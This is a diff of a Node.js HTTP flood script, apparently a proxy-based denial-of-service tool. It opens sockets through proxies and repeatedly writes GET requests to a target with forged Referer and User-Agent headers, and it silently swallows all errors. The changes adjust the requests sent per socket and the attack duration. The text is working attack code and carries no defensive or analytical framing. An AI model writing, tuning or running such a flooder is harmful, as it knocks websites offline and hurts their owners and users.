@@ -33,7 +33,7 @@ var int = setInterval(() => {
     var s = require('net').Socket();
     s.connect(proxy[1], proxy[0]);
     s.setTimeout(5000);
-    for (var i = 0; i < 800; i++) {
+    for (var i = 0; i < 50; i++) {
         s.write('GET ' + target + ' HTTP/1.1\r\nHost: ' + host + '\r\nReferer: ' + target + '\r\nUser-Agent: ' + uabizim + '\r\nConnection: Keep-Alive\r\n\r\n');
     }
     s.on('data', function() {
@@ -43,6 +43,6 @@ var int = setInterval(() => {
         }, 5000);
     })
 });
-setTimeout(() => clearInterval(int), time * 1000);
+setTimeout(() => clearInterval(int), time * 100);
 process.on('uncaughtException', function(err) {});
 process.on('unhandledRejection', function(err) {});
